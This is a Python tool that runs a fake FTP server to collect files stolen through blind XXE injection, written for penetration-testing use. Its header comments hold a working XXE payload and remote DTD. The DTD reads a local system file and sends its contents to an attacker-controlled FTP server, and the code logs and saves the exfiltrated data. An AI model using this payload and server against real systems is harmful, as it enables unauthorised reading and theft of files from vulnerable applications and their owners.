#!/usr/bin/env python3
import time
from optparse import OptionParser
from sys import stdout
from socketserver import BaseRequestHandler, ThreadingTCPServer
import asyncio
import threading

# ftp-xxe XXE data retrieval server updated for Python 3 and providing basic PASV support for clients that request it and die without it

# Blind Example: 
# XXE injection
#<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://server/remote-dtd.dtd"> %xxe;]>

# remote DTD
#<!ENTITY % file SYSTEM "file:///c:/Windows/win.ini">
#<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'ftp://server:port/%file;'>">
#%eval;
#%exfiltrate;



# used for PASV server
def tcpWorker(host, port):
    
    # this is unlikely to ever receive anything, it just needs to be ready to accept a TCP connection
    async def handle_client(reader, writer):
        data = await reader.read(100)
        message = data.decode()
        addr = writer.get_extra_info('peername')
        print(f"Received {message!r} from {addr!r}")
        writer.write(data)
        await writer.drain()
        writer.close()

    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)

    server = asyncio.start_server(handle_client, host, port)
    loop.run_until_complete(server)
    loop.run_forever()


    
class FTPHandler(BaseRequestHandler):
    """Handler for FTP sessions."""

    def debug(self, message):
        """Show log message."""
        if self.server.debug:
            print('***', message)

    def respond(self, code, explanation):
        """Send a response to the client."""
        self.request.send(b'%d %s\r\n' % (code, explanation))

    def process_request(self):
        """Parse input into a command and an argument."""
        
        data = self.recvall()
        parts = data.strip().split(b' ',1)
        return parts.pop(0), parts, data.strip()


    def save_to_file(self, data):
        client = '%s:%d' % self.client_address
        filename = client + '-' + str(int(time.time()))
        with open(filename, 'w') as f:
            f.write(data)

    def recvall(self, timeout=''):
        #setup to use non-blocking sockets
        #if no data arrives it assumes transaction is done
        #recv() returns bytes
        self.request.setblocking(0)
        total_data=[]
        data=''
        begin=time.time()
        if not timeout:
            timeout=1
        while 1:
            #if you got some data, then break after wait sec
            if total_data and time.time()-begin>timeout:
                break
            #if you got no data at all, wait a little longer
            elif time.time()-begin>timeout*2:
                break
            wait=0
            try:
                data=self.request.recv(64)
                if data:
                    total_data.append(data)
                    begin=time.time()
                    data='';wait=0
                else:
                    time.sleep(0.001)
            except:
                pass
            #When a recv returns 0 bytes, other side has closed
        result=b''.join(total_data)
        return result

    def handle(self):
        """Handle incoming data."""
        self.debug('Connection from %s:%d.' % self.client_address)
        self.respond(220, b'Welcome')
        self.recvdata = ''
        
        while True:
            cmd, args, data = self.process_request()
            arg = (args and args[0] or '')
            if cmd == b'USER':
                self.debug(data.strip())
                self.respond(331, b'Please specify the password.')
                #self.debug('')
            elif cmd == b'PASS':
                self.debug(data.strip())
                self.respond(230, b'Login successful')
            elif cmd == b'PWD':
                self.debug(data.strip())
                self.respond(257, b'"/" is the current directory.')
            elif cmd == b'TYPE':
                self.debug(data.strip())
                self.respond(200, b'Type set to: Binary')
            elif cmd == b'OPTS':
                self.debug(data.strip())
                self.respond(501, b'Invalid argument.')
            elif cmd == b'PASV':

                # super hacky PASV standin - for some servers there just needs to be something to connect to for the RETR with file content to happen after PASV
                # saying not supported might be better?
                if not self.server.pasv_running:
                    bgsk = threading.Thread(target=tcpWorker, args=(self.server.server_address[0], self.server.pasv_port), daemon=True).start()
                    self.server.pasv_running = True

                self.debug(data.strip())
                # PASV port is number 5 * 256 + number 6(!)
                resp = 'Entering passive mode ({},{},{}).'.format(','.join(self.server.server_address[0].split('.')), round(self.server.pasv_port/256), self.server.pasv_port%256)
                self.respond(277, bytes(resp, 'utf8'))
                self.debug(resp)
                if self.server.server_address[0] == '0.0.0.0':
                    self.debug('DEBUG: If things fail here try setting the i option to the IP address the client is connecting to')
            elif cmd == b'EPSV':
                self.debug(data.strip())
                self.respond(522, b'Not supported')
                self.debug('R: 522, Not supported')
            elif cmd == b'CWD':             
                self.debug(data.strip())
                self.recvdata += '/' + arg
                self.respond(230, b'Proceed')
            elif cmd == b'RETR':
                self.debug(data.strip())
                if self.server.verbose or self.debug:
                    stdout.write('File content:\n\n')
                    stdout.write(arg.decode())
                self.recvdata += str(arg)
                self.respond(530, b'Go away')
                break
            else:
                self.debug(data.strip())
                self.respond(230, b'Proceed')
                self.debug('R: 230, Proceed')

        self.request.close()
        if self.server.verbose or self.debug:
            print("\n")
        if self.server.save_to_file:
            self.save_to_file(self.recvdata) 
        self.debug('Connection with %s:%d closed.' % self.client_address)


class FTPServer(ThreadingTCPServer):

    def __init__(self, host='', port=21, debug=False, save_to_file=False, verbose=True, pasv_port=63071):
        ThreadingTCPServer.__init__(self, (host, port), FTPHandler)
        self.debug = debug
        self.verbose = verbose
        self.save_to_file = save_to_file
        self.pasv_port = pasv_port
        self.pasv_running = False


    def server_close(self):
        ThreadingTCPServer.server_close(self)



if __name__ == '__main__':
    parser = OptionParser(usage='%prog [options] <port>')
    parser.add_option('-d', '--debug', dest='debug', action='store_true', help='show debugging messages')
    parser.add_option('-s', '--save', dest='save_to_file', action='store_true', help='write collected data to generated logfiles')
    parser.add_option('-i', '--ip', dest='host', default='', help='local ip address to bind to, might be required if remote client requests PASV mode')
    parser.add_option('-p', '--pasv_port', dest='pasv_port', default=63071, type=int, help='Local server port to use for PASV, if required')
    opts, args = parser.parse_args()

    # Parse arguments.
    if len(args) != 1:
        parser.print_help()
        parser.exit()
    try:
        port = int(args[0])
    except ValueError:
        parser.print_help()
        parser.exit()
    


    server = FTPServer(port=port, **opts.__dict__)
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print('Ctrl-C pressed, exiting...')
    server.server_close()
